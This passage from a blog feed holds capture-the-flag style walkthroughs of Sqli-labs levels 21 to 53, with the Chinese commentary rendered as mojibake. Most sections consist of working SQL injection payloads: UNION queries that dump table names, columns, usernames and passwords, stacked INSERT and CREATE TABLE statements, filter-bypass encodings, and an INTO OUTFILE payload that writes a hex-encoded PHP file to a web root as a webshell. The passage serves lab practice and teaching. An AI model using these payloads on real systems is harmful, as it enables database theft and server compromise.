id="0x02-Less-39-GET-å †å æ³¨å…¥-æ•´å‹"><a href="#0x02-Less-39-GET-å †å æ³¨å…¥-æ•´å‹" class="headerlink" title="0x02.Less-39 GET å †å æ³¨å…¥ æ•´å‹"></a>0x02.Less-39 GET å †å æ³¨å…¥ æ•´å‹</h2><p><code>åŒless-38ï¼Œå°†å•å¼•å·å»æ‰å³å¯</code></p><h2 id="0x03-Less-40-GET-åŸºäºbool-å †å æ³¨å…¥-å•å¼•å·-æ‹¬å·"><a href="#0x03-Less-40-GET-åŸºäºbool-å †å æ³¨å…¥-å•å¼•å·-æ‹¬å·" class="headerlink" title="0x03.Less-40 GET åŸºäºbool å †å æ³¨å…¥ å•å¼•å·+æ‹¬å·"></a>0x03.Less-40 GET åŸºäºbool å †å æ³¨å…¥ å•å¼•å·+æ‹¬å·</h2><p><code>boolæ³¨å…¥ä¸åœ¨èµ˜è¿°ï¼Œä½¿ç”¨å¦‚ä¸‹payload</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;);insert into users values(22,&#x27;sha&#x27;,&#x27;gou&#x27;) -- -</span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹ï¼Œå¯ä»¥çœ‹åˆ°æ’å…¥æˆåŠŸ</code></p><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201133805018.png" class><h2 id="0x04-Less-41-GET-åŸºäºbool-å †å æ³¨å…¥-æ•´å‹"><a href="#0x04-Less-41-GET-åŸºäºbool-å †å æ³¨å…¥-æ•´å‹" class="headerlink" title="0x04.Less-41 GET åŸºäºbool å †å æ³¨å…¥ æ•´å‹"></a>0x04.Less-41 GET åŸºäºbool å †å æ³¨å…¥ æ•´å‹</h2><p><code>åŒless-40ï¼Œå»æ‰&#39;)å³å¯</code></p><h2 id="0x05-Less-42-POST-åŸºäºæŠ¥é”™-å †å æ³¨å…¥"><a href="#0x05-Less-42-POST-åŸºäºæŠ¥é”™-å †å æ³¨å…¥" class="headerlink" title="0x05.Less-42 POST åŸºäºæŠ¥é”™ å †å æ³¨å…¥"></a>0x05.Less-42 POST åŸºäºæŠ¥é”™ å †å æ³¨å…¥</h2><p><code>è¿™é‡Œç‚¹å‡»æ³¨å†Œç”¨æˆ·å‡ºç°å¦‚ä¸‹é¡µé¢</code></p><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201135038039.png" class><p><code>æŸ¥çœ‹æºç å‘ç°ï¼Œpasswordæ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œæ­¤å¤„å¯ä»¥è¿›è¡Œæ³¨å…¥</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$con1 = mysqli_connect($host,$dbuser,$dbpass, $dbname);</span><br><span class="line">   </span><br><span class="line">   $username = mysqli_real_escape_string($con1, $_POST[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   $password = $_POST[<span class="string">&quot;login_password&quot;</span>];</span><br></pre></td></tr></table></figure><p><code>æµ‹è¯•å‘ç°é—­åˆå­—ç¬¦ä¸ºå•å¼•å·</code></p><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201141358328.png" class><p><code>æ³¨å…¥</code></p><blockquote><p>è¿™é‡Œæ²¡æœ‰æƒ³åˆ°å¥½çš„åŠæ³•è¿›è¡Œçˆ†åº“çˆ†è¡¨çˆ†å­—æ®µï¼ˆèœæ˜¯åŸç½ªã€‚ã€‚ã€‚ï¼‰</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users values(55,&#39;de&#39;,&#39;de&#39;) -- -</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201142502360.png" class><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201142524651.png" class><h2 id="0x06-Less-43-POST-åŸºäºæŠ¥é”™-å †å æ³¨å…¥-å•å¼•å·-æ‹¬å·"><a href="#0x06-Less-43-POST-åŸºäºæŠ¥é”™-å †å æ³¨å…¥-å•å¼•å·-æ‹¬å·" class="headerlink" title="0x06.Less-43 POST åŸºäºæŠ¥é”™ å †å æ³¨å…¥ å•å¼•å·+æ‹¬å·"></a>0x06.Less-43 POST åŸºäºæŠ¥é”™ å †å æ³¨å…¥ å•å¼•å·+æ‹¬å·</h2><p><code>åŒless-42ï¼Œå°†å•å¼•å·æ¢ä¸º&#39;)å³å¯</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users values(66,&#39;ha&#39;,&#39;ha&#39;) -- -</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201143741102.png" class><h2 id="0x07-Less-44-POST-åŸºäºæŠ¥é”™-å †å æ³¨å…¥blind"><a href="#0x07-Less-44-POST-åŸºäºæŠ¥é”™-å †å æ³¨å…¥blind" class="headerlink" title="0x07.Less-44 POST åŸºäºæŠ¥é”™ å †å æ³¨å…¥blind"></a>0x07.Less-44 POST åŸºäºæŠ¥é”™ å †å æ³¨å…¥blind</h2><p><code>åŒless42ï¼Œä½†æ­¤å¤„&#39;æ— å›æ˜¾</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users values(32,&#x27;demo&#x27;,&#x27;demo&#x27;) -- -</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201144925798.png" class><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201145028708.png" class><h2 id="0x08-Less-45-POST-åŸºäºæŠ¥é”™-å †å æ³¨å…¥blind"><a href="#0x08-Less-45-POST-åŸºäºæŠ¥é”™-å †å æ³¨å…¥blind" class="headerlink" title="0x08.Less-45 POST åŸºäºæŠ¥é”™ å †å æ³¨å…¥blind"></a>0x08.Less-45 POST åŸºäºæŠ¥é”™ å †å æ³¨å…¥blind</h2><p><code>åŒless42ï¼Œé—­åˆå­—ç¬¦ä¸º&#39;)ï¼Œä»ç„¶æ— å›æ˜¾</code></p><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201145317106.png" class><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201145302646.png" class><h2 id="0x09-Less-46-GET-åŸºäºæŠ¥é”™-æ•°å­—-order-by"><a href="#0x09-Less-46-GET-åŸºäºæŠ¥é”™-æ•°å­—-order-by" class="headerlink" title="0x09.Less-46 GET åŸºäºæŠ¥é”™ æ•°å­— order by"></a>0x09.Less-46 GET åŸºäºæŠ¥é”™ æ•°å­— order by</h2><p><code>æŸ¥çœ‹æºç å‘ç°sqlè¯­å¥å¦‚ä¸‹</code></p><blockquote><p>order by ä¸åŒäºwhereï¼Œorder by åä¸èƒ½æ‹¼æ¥union</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;SELECT * FROM users ORDER BY $id&quot;</span>;</span><br></pre></td></tr></table></figure><p><code>ç›´æ¥æ„é€ æŠ¥é”™è¯­å¥ï¼Œå…¶ä»–è¿‡ç¨‹ä¸åœ¨èµ˜è¿°</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="number">0</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>) -- -</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201233943796.png" class><p><strong>skip</strong></p><p><code>è¿™é‡Œå¯ä»¥ä½¿ç”¨into outfileé…åˆlines  terminated by 0xå†™å…¥webshell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 and into outfile &quot;C:\\phpStudy\\WWW\\less46.php&quot; lines  terminated by 3c3f7068700a706870696e666f28293b0a3f3e -- -</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œç”±äºæ²¡æœ‰æƒé™æ‰€ä»¥å¤±è´¥äº†ï¼Œä½†è¿™ä¹Ÿæ˜¯ä¸€ä¸ªä¸é”™çš„æ€è·¯ã€‚</p></blockquote><h2 id="0x10-Less-47-GET-åŸºäºæŠ¥é”™-å­—ç¬¦-order-by"><a href="#0x10-Less-47-GET-åŸºäºæŠ¥é”™-å­—ç¬¦-order-by" class="headerlink" title="0x10.Less-47 GET åŸºäºæŠ¥é”™ å­—ç¬¦ order by"></a>0x10.Less-47 GET åŸºäºæŠ¥é”™ å­—ç¬¦ order by</h2><p><code>åŒä¸Šï¼Œé—­åˆå­—ç¬¦ä¸ºå•å¼•å·</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=0&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202000047262.png" class><h2 id="0x11-Less-48-GET-åŸºäºbool-æ•°å­—-order-by"><a href="#0x11-Less-48-GET-åŸºäºbool-æ•°å­—-order-by" class="headerlink" title="0x11.Less-48 GET åŸºäºbool æ•°å­— order by"></a>0x11.Less-48 GET åŸºäºbool æ•°å­— order by</h2><p><code>è¿™é‡Œä½¿ç”¨rand()å‡½æ•°è¿›è¡Œå›æ˜¾åˆ¤æ–­</code></p><blockquote><p>rand(0)å¦‚ä¸‹</p></blockquote><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202001551841.png" class><blockquote><p>rand(1)å¦‚ä¸‹</p></blockquote><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202001610943.png" class><p><code>çˆ†åº“</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(left((select database()),1)=&#x27;a&#x27;)</span><br><span class="line">?sort=rand(left((select database()),1)=&#x27;s&#x27;)</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202001526992.png" class><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202001730347.png" class><blockquote><p>å…¶ä»–è¿‡ç¨‹ä¸åœ¨èµ˜è¿°</p></blockquote><h2 id="0x12-Less-49-GET-åŸºäºbool-å­—ç¬¦-order-by"><a href="#0x12-Less-49-GET-åŸºäºbool-å­—ç¬¦-order-by" class="headerlink" title="0x12.Less-49 GET åŸºäºbool å­—ç¬¦ order by"></a>0x12.Less-49 GET åŸºäºbool å­—ç¬¦ order by</h2><p><code>åŒä¸Šï¼Œé—­åˆå­—ç¬¦ä¸ºå•å¼•å·ï¼Œæœ¬æ¬¡ä½¿ç”¨å¯¼å‡ºæ–‡ä»¶ä¸Šä¼ webshell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&#x27; and into outfile &quot;/var/www/html/Less-49/demo.php&quot; lines  terminated by 3c3f7068700a706870696e666f28293b0a3f3e -- -</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œ3c3f7068700a706870696e666f28293b0a3f3eä¸º<?php phpinfo();?>çš„16è¿›åˆ¶</p></blockquote><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202004930920.png" class><h2 id="0x13-Less-50-åŸºäºæŠ¥é”™-GET-order-by-æ•°å­—-å †å æ³¨å…¥"><a href="#0x13-Less-50-åŸºäºæŠ¥é”™-GET-order-by-æ•°å­—-å †å æ³¨å…¥" class="headerlink" title="0x13.Less-50 åŸºäºæŠ¥é”™ GET order by æ•°å­— å †å æ³¨å…¥"></a>0x13.Less-50 åŸºäºæŠ¥é”™ GET order by æ•°å­— å †å æ³¨å…¥</h2><p><code>æŸ¥çœ‹æºç å‘ç°ï¼Œå°†mysql_query()å‡½æ•°æ¢ä¸ºäº†mysqli_multi_query()å‡½æ•° ï¼Œå¯ä»¥å¤šè¯­å¥æŸ¥è¯¢ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨å †å æ³¨å…¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1;create table demo like users; -- -</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202111325863.png" class><p><code>å…¶ä»–è¿‡ç¨‹ä¸åœ¨èµ˜è¿°</code></p><h2 id="0x014-Less-51-åŸºäºæŠ¥é”™-GET-order-by-å­—ç¬¦-å †å æ³¨å…¥"><a href="#0x014-Less-51-åŸºäºæŠ¥é”™-GET-order-by-å­—ç¬¦-å †å æ³¨å…¥" class="headerlink" title="0x014.Less-51 åŸºäºæŠ¥é”™ GET order by å­—ç¬¦ å †å æ³¨å…¥"></a>0x014.Less-51 åŸºäºæŠ¥é”™ GET order by å­—ç¬¦ å †å æ³¨å…¥</h2><p><code>åŒä¸Šï¼Œé—­åˆå­—ç¬¦ä¸ºå•å¼•å·</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&#x27;;create table demo like users; -- -</span><br></pre></td></tr></table></figure><h2 id="0x15-Less-52-åŸºäºbool-GET-order-by-æ•°å­—-å †å æ³¨å…¥"><a href="#0x15-Less-52-åŸºäºbool-GET-order-by-æ•°å­—-å †å æ³¨å…¥" class="headerlink" title="0x15.Less-52 åŸºäºbool GET order by æ•°å­— å †å æ³¨å…¥"></a>0x15.Less-52 åŸºäºbool GET order by æ•°å­— å †å æ³¨å…¥</h2><p><code>åŒä¸Šç›´æ¥å †å æ³¨å…¥å³å¯</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1;create table hade like users; -- -</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202112340757.png" class><h2 id="0x16-Less-53-åŸºäºbool-GET-order-by-å­—ç¬¦-å †å æ³¨å…¥"><a href="#0x16-Less-53-åŸºäºbool-GET-order-by-å­—ç¬¦-å †å æ³¨å…¥" class="headerlink" title="0x16.Less-53 åŸºäºbool GET order by å­—ç¬¦ å †å æ³¨å…¥"></a>0x16.Less-53 åŸºäºbool GET order by å­—ç¬¦ å †å æ³¨å…¥</h2><p><code>åŒä¸Šï¼Œé—­åˆå­—ç¬¦ä¸ºå•å¼•å·ï¼Œç›´æ¥å †å æ³¨å…¥å³å¯</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&#x27;;create table qq like users; -- -</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;Sqli_labs_Page3(stacked)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æœ¬ç¯‡å¤§éƒ¨åˆ†è€ƒå¯Ÿå †å æ³¨å…¥&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Sqli-labs" scheme="https://lunamoore.github.io/categories/Sqli-labs/"/>
    
    
    <category term="Sqli-labs" scheme="https://lunamoore.github.io/tags/Sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>Sqli_labs_Page2(advance)</title>
    <link href="https://lunamoore.github.io/2021/01/19/Sqli-labs-Page2-adv/"/>
    <id>https://lunamoore.github.io/2021/01/19/Sqli-labs-Page2-adv/</id>
    <published>2021-01-19T03:24:02.000Z</published>
    <updated>2021-01-19T03:42:51.669Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Sqli_labs_Page2(advance)</strong></p><p> <strong>skip:åŸºç¡€ç¯‡ç¯å¢ƒä¸ºwindowsï¼Œä½†åœ¨æé«˜ç¯‡æœ‰äº›å…³å¡ä¼šå‡ºç°è§£æé”™è¯¯ï¼Œæœ¬ç¯‡ä½¿ç”¨dockeræ­å»ºçš„Linuxç¯å¢ƒ</strong></p><a id="more"></a><h2 id="0x01-Less-21-Cookieæ³¨å…¥-base64ç¼–ç -å•å¼•å·åŠ æ‹¬å·"><a href="#0x01-Less-21-Cookieæ³¨å…¥-base64ç¼–ç -å•å¼•å·åŠ æ‹¬å·" class="headerlink" title="0x01.Less-21 Cookieæ³¨å…¥ base64ç¼–ç  å•å¼•å·åŠ æ‹¬å·"></a>0x01.Less-21 Cookieæ³¨å…¥ base64ç¼–ç  å•å¼•å·åŠ æ‹¬å·</h2><p><code>demo payload</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) order by 4 -- -</span><br><span class="line">YWRtaW4nKSBvcmRlciBieSA0IC0tIC0=</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116142128479.png" class><p><code>çˆ†åº“</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;) union select 1,2,database() -- -</span><br><span class="line">MCcpIHVuaW9uIHNlbGVjdCAxLDIsZGF0YWJhc2UoKSAtLSAt</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116142319509.png" class><blockquote><p>å…¶ä»–æ–¹å¼ä¸åœ¨èµ˜è¿°</p></blockquote><h2 id="0x02-Less-22-Cookieæ³¨å…¥-base64ç¼–ç -åŒå¼•å·"><a href="#0x02-Less-22-Cookieæ³¨å…¥-base64ç¼–ç -åŒå¼•å·" class="headerlink" title="0x02.Less-22 Cookieæ³¨å…¥ base64ç¼–ç  åŒå¼•å·"></a>0x02.Less-22 Cookieæ³¨å…¥ base64ç¼–ç  åŒå¼•å·</h2><blockquote><p>åŒLess-21ï¼Œå°†é—­åˆå­—ç¬¦æ¢ä¸ºåŒå¼•å·å³å¯</p></blockquote><h2 id="0x03-Less-23-åŸºäºæŠ¥é”™-è¿‡æ»¤æ³¨é‡Š"><a href="#0x03-Less-23-åŸºäºæŠ¥é”™-è¿‡æ»¤æ³¨é‡Š" class="headerlink" title="0x03.Less-23 åŸºäºæŠ¥é”™ è¿‡æ»¤æ³¨é‡Š"></a>0x03.Less-23 åŸºäºæŠ¥é”™ è¿‡æ»¤æ³¨é‡Š</h2><p><code>æ­¤é¢˜è¿‡æ»¤äº†--å’Œ#ï¼Œæµ‹è¯•å‘ç°é—­åˆå­—ç¬¦ä¸ºå•å¼•å·</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; or &#x27;1&#x27; = &#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116145228775.png" class><p><code>æ—¢ç„¶è¿‡æ»¤äº†æ³¨é‡Šç¬¦é‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨äºŒæ¬¡æ³¨å…¥ç»“åˆ%00è¿›è¡Œæˆªæ–­</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 4;%00</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116145628665.png" class><p><code>çˆ†åº“</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,database(),user();%00</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116145754610.png" class><blockquote><p>å…¶ä»–æ–¹æ³•ä¸åœ¨èµ˜è¿°</p></blockquote><p><code>ä¹Ÿå¯ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,2,database() &#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116150158281.png" class><p><code>çˆ†è¡¨ï¼Œä»¥ä¸‹ä¸¤ä¸ªpayloadå‡å¯ä»¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),3 &#x27;</span><br><span class="line"></span><br><span class="line">?id=0&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() or &#x27;1&#x27;= &#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116150637871.png" class><p><code>çˆ†åˆ—å</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),3 &#x27;</span><br><span class="line"></span><br><span class="line">?id=0&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; or &#x27;1&#x27;= &#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116151251994.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116151415888.png" class><p><code>çˆ†æ•°æ®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,(select username from users limit 0,1),3 &#x27;</span><br><span class="line">?id=0&#x27; union select 1,(select password from users limit 0,1),3 &#x27;</span><br><span class="line"></span><br><span class="line">?id=0&#x27; union select 1,group_concat(username),group_concat(password) from users where 1 or &#x27;1&#x27; = &#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116151653100.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116151801467.png" class><h2 id="0x04-Less-24-äºŒæ¬¡æ³¨å…¥"><a href="#0x04-Less-24-äºŒæ¬¡æ³¨å…¥" class="headerlink" title="0x04.Less-24 äºŒæ¬¡æ³¨å…¥"></a>0x04.Less-24 äºŒæ¬¡æ³¨å…¥</h2><p><code>é¡µé¢å¯ä»¥æ³¨å†Œç”¨æˆ·</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116152202362.png" class><blockquote><p>æ€è·¯ä¸ºæ³¨å†Œä¸€ä¸ªadminâ€™ â€“ -æˆ–adminâ€™# ç”¨æˆ·ï¼Œç„¶åå†è¿›è¡Œä¿®æ”¹å¯†ç æ“ä½œ</p></blockquote><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116152940647.png" class><p><code>admin&#39; -- -ç™»å…¥</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116153011802.png" class><p><code>ä¿®æ”¹å¯†ç </code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116153045305.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116153058942.png" class><p><code>é€€å‡ºä½¿ç”¨adminç™»å…¥</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116153139415.png" class><h2 id="0x05-Less-25-GET-åŸºäºæŠ¥é”™-è¿‡æ»¤andä¸or-å•å¼•å·"><a href="#0x05-Less-25-GET-åŸºäºæŠ¥é”™-è¿‡æ»¤andä¸or-å•å¼•å·" class="headerlink" title="0x05.Less-25 GET åŸºäºæŠ¥é”™ è¿‡æ»¤andä¸or å•å¼•å·"></a>0x05.Less-25 GET åŸºäºæŠ¥é”™ è¿‡æ»¤andä¸or å•å¼•å·</h2><p><code>è¿‡æ»¤äº†andä¸orå¯ä»¥ä½¿ç”¨åŒå†™ã€å¤§å°å†™æ··åˆã€å†…è”æ³¨é‡Šã€urlå…¨ç¼–ç è¿›è¡Œç»•è¿‡ï¼›andä¸orå¯ä»¥ä½¿ç”¨é€»è¾‘è¿ç®—ç¬¦(|| &amp;&amp;)è¿›è¡Œä»£æ›¿</code></p><blockquote><p>æµ‹è¯•å‘ç°åªèƒ½ä½¿ç”¨åŒå†™</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; oorrder by 4 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116155639053.png" class><blockquote><p>å…¶ä»–è¿‡ç¨‹ä¸åœ¨èµ˜è¿°</p></blockquote><h2 id="0x06-Less-25a-GET-åŸºäºbool-è¿‡æ»¤andä¸or"><a href="#0x06-Less-25a-GET-åŸºäºbool-è¿‡æ»¤andä¸or" class="headerlink" title="0x06.Less-25a GET åŸºäºbool è¿‡æ»¤andä¸or"></a>0x06.Less-25a GET åŸºäºbool è¿‡æ»¤andä¸or</h2><p><code>ä¸Less-25ç›¸ä¼¼ï¼Œä½†æ²¡æœ‰å•å¼•å·</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1 aandnd if(length(database())=8,sleep(5),1)-- -</span><br><span class="line"></span><br><span class="line">ä¹Ÿå¯ä»¥ä½¿ç”¨unionè”åˆæŸ¥è¯¢</span><br><span class="line"></span><br><span class="line">?id=0 union select 1,2,database() -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116161933977.png" class><blockquote><p>å…¶ä»–è¿‡ç¨‹ä¸åœ¨èµ˜è¿°</p></blockquote><h2 id="0x07-Less-26-GET-åŸºäºæŠ¥é”™-è¿‡æ»¤ç©ºæ ¼ä¸å­—ç¬¦"><a href="#0x07-Less-26-GET-åŸºäºæŠ¥é”™-è¿‡æ»¤ç©ºæ ¼ä¸å­—ç¬¦" class="headerlink" title="0x07.Less-26 GET åŸºäºæŠ¥é”™ è¿‡æ»¤ç©ºæ ¼ä¸å­—ç¬¦"></a>0x07.Less-26 GET åŸºäºæŠ¥é”™ è¿‡æ»¤ç©ºæ ¼ä¸å­—ç¬¦</h2><p><code>æŸ¥çœ‹æºç ï¼Œå‘ç°è¿‡æ»¤äº†ä»¥ä¸‹å­—ç¬¦</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);            <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//strip out /*</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out --</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);            <span class="comment">//Strip out #</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out spaces</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out slashes</span></span><br><span class="line">    <span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>æµ‹è¯•é—­åˆå­—ç¬¦ï¼Œç”±äºè¿‡æ»¤äº†ç©ºæ ¼ï¼Œæ‰€ä»¥ä½¿ç”¨%a0æˆ–%0bä»£æ›¿ç©ºæ ¼ï¼Œè¿™é‡Œå‘ç°å•å¼•å·ä¸ºé—­åˆå­—ç¬¦</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0boorr%0b&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=0&#x27;%0boorr%0b&#x27;1&#x27;=&#x27;2</span><br><span class="line">?id=0&#x27;%a0oorr%a0&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=0&#x27;%a0oorr%a0&#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117215557295.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117215623266.png" 